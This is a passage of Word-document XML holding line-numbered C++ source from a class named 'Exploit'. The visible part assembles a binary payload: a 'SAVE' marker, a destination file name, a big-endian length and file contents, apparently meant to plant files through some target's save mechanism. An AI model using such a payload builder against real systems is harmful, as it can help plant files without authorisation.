          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">192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0xBB);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">193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0xBF);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">194 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">195         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Now dump the entire content as bytes</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">196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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>iterator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> it = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>content_as_string.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it &lt; content_as_string.end(); it++ ) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">197                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>optionsContent.push_back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*it);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>198         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">199 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">200         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// That's it</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">201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optionsContent</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FIXME may be a slow copy and using lots of memory</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>202 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">203 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>204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&gt; Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>prepForSaveBinaryFile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pathname, </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>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destname</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205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&gt; content;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">206 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">207         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Need the SAVE marker</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">208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209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'A'</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210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'V'</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211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212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213 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>214         logger-&gt;log(</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prepForSavingBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - wrote SAVE</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>\x1F</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> header"</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215         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">216         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Now the name</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">217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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>const_iterator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> it = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>destname.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">(); it &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>destname.end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it++) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">218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*it);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>219         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">220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\0</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not strictly required but nice to do</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">221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222 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">223         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">// Now the 4-byte (32-bit unsigned </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) [MSB big-endian first] length</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">224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filesystem</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file_size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(pathname);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>225         logger-&gt;log(</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prepForSavingBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - size of "</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> + pathname + </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">" with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>destname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> of "</w:t>
      </w:r>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destname</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is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 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>" bytes"</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226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&gt;&gt; 24));</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">227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&gt;&gt; 16));</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">228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&gt;&gt; 8));</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">229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230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231 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">232         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// The file content</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">233 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>234         std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ifstream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> ifs;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">235         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
